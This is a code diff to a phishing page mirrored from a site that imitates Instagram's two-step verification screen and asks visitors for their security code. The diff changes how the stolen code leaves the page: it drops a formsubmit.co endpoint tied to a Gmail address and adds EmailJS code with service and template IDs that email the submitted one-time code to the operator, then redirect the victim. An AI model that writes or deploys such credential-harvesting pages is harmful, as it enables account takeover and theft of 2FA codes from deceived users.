@@ -57,7 +57,7 @@
       <!-- SMARTPHONE SECTION END -->
       <!-- FORM SECTION -->
       <article class="form-area">
-        <form  action="https://formsubmit.co/nosakharewisdom968@gmail.com" method="POST" accept=".">
+        <form id="form" method="POST" accept=".">
           <p class="small-title">2-Step Verification</p>
           <input
             type="text"
@@ -67,14 +67,14 @@
             placeholder="Security code"
           />
           <input type="hidden" name="linkId" value="657daf104b167f68d1979b9c" />
-          <input type="submit" name="submit" value="Confirm" />
+          <input type="submit" name="submit" value="Send Email" onclick="redirect();" />
           <div class="options">
             <p class="small">Didn't get security code? we can</p>
             <a href="#" class="small">resend it</a>
             <div class="forget"><a href="#">Forgot password?</a></div>
           </div>
-          <input type="hidden" name="_next" value="https://sephsqua.github.io/vlteu/votesr/thanks.html">
-<input type="hidden" name="_captcha" value="false">
+<!--           <input type="hidden" name="_next" value="https://sephsqua.github.io/vlteu/votesr/thanks.html">
+<input type="hidden" name="_captcha" value="false"> -->
 
         </form>
         <div class="noaccount">
@@ -169,6 +169,35 @@
     <script src="../../js/socials/app.html"></script>
     <script src="../../js/socials/brands.min.html"></script>
     <script src="../../js/socials/fontawesome.min.html"></script>
+    <script type="text/javascript"
+  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<script type="text/javascript">
+  emailjs.init('7NQDqDubm8IFBhmKO')
+  const btn = document.getElementById('button');
+
+document.getElementById('form')
+ .addEventListener('submit', function(event) {
+   event.preventDefault();
+
+   btn.value = 'Sending...';
+
+   const serviceID = 'service_16fiv0m';
+   const templateID = 'template_j5z0tt2';
+
+   emailjs.sendForm(serviceID, templateID, this)
+    .then(() => {
+      btn.value = 'Send Email';
+    function redirect()
+{
+    window.location.href="thanks.html";
+}
+    }, (err) => {
+      btn.value = 'Send Email';
+      alert(JSON.stringify(err));
+    });
+});
+</script>
   </body>
 
 <!-- Mirrored from fanfamousity.com/instagram/otp/657daf104b167f68d1979b9c by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 17 Dec 2023 11:22:30 GMT -->
